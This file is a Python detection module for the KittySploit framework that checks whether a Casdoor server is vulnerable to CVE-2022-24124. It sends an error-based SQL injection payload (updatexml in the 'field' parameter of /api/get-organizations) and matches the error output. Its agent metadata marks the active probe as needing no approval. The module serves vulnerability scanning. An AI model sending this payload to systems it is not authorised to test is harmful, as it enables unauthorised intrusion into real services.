#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Casdoor version 1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Casdoor 1.13.0 - Unauthenticated SQL Injection Detection',
        'description': 'Casdoor version 1.13.0 suffers from a remote unauthenticated SQL injection vulnerability via the query API in Casdoor before 1.13.1 related to the field and value parameters, as demonstrated by api/get-organizations.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'sqli', 'unauth', 'packetstorm', 'edb', 'casdoor', 'casbin', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/166163/Casdoor-1.13.0-SQL-Injection.html',
            'https://www.exploit-db.com/exploits/50792',
            'https://github.com/cckuailong/reapoc/tree/main/2022/CVE-2022-24124/vultarget',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-24124',
            'https://github.com/casdoor/casdoor/compare/v1.13.0...v1.13.1',
        ],
        'cve': 'CVE-2022-24124',
    }

    def run(self):
        r = self.http_request(method="GET", path='/api/get-organizations?p=123&pageSize=123&value=cfx&sortField=&sortOrder=&field=updatexml(1,version(),1)', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('XPATH syntax error.*&#39', 'casdoor',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Casdoor 1.13.0 - Unauthenticated SQL Injection detected",
                path='/api/get-organizations?p=123&pageSize=123&value=cfx&sortField=&sortOrder=&field=updatexml(1,version(),1)',
            )
            return True
        return False

